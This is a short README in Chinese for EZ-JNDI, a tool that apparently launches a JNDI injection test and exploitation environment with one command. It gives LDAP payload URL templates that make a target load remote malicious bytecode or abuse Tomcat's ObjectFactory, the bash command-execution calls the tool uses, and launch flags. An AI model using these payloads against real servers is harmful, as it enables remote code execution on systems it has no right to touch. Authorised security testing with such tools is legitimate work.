# EZ-JNDI
一键启动JNDI测试/利用环境。

LDAP Payload：
```text
ldap://{IP}:{Port}/Foo --> 利用远程CodeBase加载恶意字节码执行命令
ldap://{IP}:{Port}/Tom --> 使用Tomcat本地ObjectFactory执行命令
```
执行命令使用的方式是（目前支持Linux环境），无需对命令进行base64编码：
```java
Runtime.getRuntime.exec(new String[]{"/bin/bash", "-c", "{command}"});
New ProcessBuilder(new String[]{"/bin/bash", "-c", "{command}").start();
```

LDAP默认端口1099，HTTP默认端口8080，可以使用命令行参数配置端口：
```text
java -jar ezjndi1.0.jar --help
java -jar ezjndi1.0.jar -lp={port1} -hp={port2} -c="{command}"
```

![img.png](img/img.png)

![img.png](img/img2.png)

TODO:
- 直接返回序列化数据
- Windows环境下利用cmd执行命令（`cmd /c {command}`）